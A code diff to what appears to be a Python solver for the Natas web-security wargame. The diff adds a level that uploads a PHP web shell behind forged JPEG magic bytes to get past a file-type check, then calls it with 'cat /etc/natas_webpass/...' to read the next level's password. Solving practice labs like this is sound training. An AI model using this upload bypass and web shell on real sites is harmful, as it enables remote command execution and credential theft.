@@ -116,7 +116,28 @@ def getPassword(auth, level) :
 		hrefP = r'<a href=\"(\S+)\">'
 		result = re.search(hrefP, str(r.content))
 
-		url += (result.group(1) + '?e=cat /etc/natas_webpass/natas13')
+		url += (result.group(1) + '?e=cat /etc/natas_webpass/natas' + str(level + 1))
+		pattern = r'(\w+)'
+	elif level == 13 :
+		bodyData = [
+		['MAX_FILE_SIZE', '1000'], 
+		['filename', '1234567890.php'], 
+		['uploadedfile"; filename="test.php" Content-Type: application/octet-stream', 
+			'\xFF\xD8\xFF\xE0<?php echo shell_exec($_GET["e"]); ?>']
+		]
+		bundary = '-----------WebKitFormBoundary' + str(int(random.random()*1e10))
+
+		r = requests.post(
+			url, 
+			auth=auth, 
+			headers={'Content-Type' : 'multipart/form-data; boundary=' + bundary}, 
+			data=setMform(bodyData, bundary)
+		)
+		
+		hrefP = r'<a href=\"(\S+)\">'
+		result = re.search(hrefP, str(r.content))
+
+		url += (result.group(1) + '?e=cat /etc/natas_webpass/natas' + str(level + 1))
 		pattern = r'(\w+)'
 	else :
 		return str(level + 1) + ' not work'
